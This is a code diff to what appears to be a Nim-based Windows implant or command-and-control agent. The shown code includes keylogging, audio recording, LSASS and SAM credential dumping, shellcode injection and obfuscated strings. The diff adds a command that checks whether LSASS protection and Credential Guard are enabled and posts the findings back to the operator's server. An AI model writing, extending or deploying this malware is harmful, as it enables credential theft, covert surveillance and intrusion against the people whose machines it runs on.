@@ -31,6 +31,7 @@ proc wrap_record_audio(record_time: int): bool
 proc wrap_keylog_start(): bool
 proc wrap_keylog_dump(): bool
 proc wrap_keylog_stop(): bool
+proc wrap_examine_lsass(): bool
 proc dump_lsass(dump_method: string): bool
 proc dump_sam(): bool
 proc wrap_inject_shellc(shellc_base64: string, pid: int): bool
@@ -302,6 +303,21 @@ proc wrap_keylog_stop(): bool =
             protectString("status"): protectString("keylogger stopped")
         }.toOrderedTable()
     return post_data(client, protectString("keylog-stop"), $data)
+
+
+proc wrap_examine_lsass(): bool =
+    
+    var is_success: bool
+    var (lsass_prot_str, lsass_credguard_str) = examine_lsass()
+    
+    var data = {
+        protectString("Lsass protection"): lsass_prot_str,
+        protectString("Credential Guard"): lsass_credguard_str
+    }.toOrderedTable
+
+    is_success = post_data(client, protectString("lsass-examine") , $data)
+
+    return is_success
 
 
 proc dump_lsass(dump_method: string): bool = 
@@ -627,6 +643,8 @@ proc windows_parse_command*(command: JsonNode): bool =
             is_success = enum_visible_windows()
         of protectString("audio"):
             is_success = wrap_record_audio(command[protectString("record_time")].getInt())
+        of protectString("lsass-examine"):
+            is_success = wrap_examine_lsass()
         of protectString("lsass"):
             is_success = dump_lsass(command[protectString("dump_method")].getStr())
         of protectString("sam"):
